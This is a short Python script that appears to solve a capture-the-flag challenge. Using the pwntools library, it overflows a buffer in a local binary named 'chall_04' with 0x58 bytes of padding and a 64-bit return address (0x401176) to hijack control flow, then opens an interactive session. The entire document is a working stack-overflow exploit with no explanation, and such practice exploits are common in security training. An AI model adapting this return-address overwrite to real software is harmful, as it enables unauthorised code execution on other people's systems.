# coding: utf-8
from pwn import *
def exploit():
    proc= process("./chall_04")
    p= b'a'* (0x60- 8)+ p64(0x00401176)
    proc.sendline(p)
    proc.interactive()
    proc.close()
    
exploit()
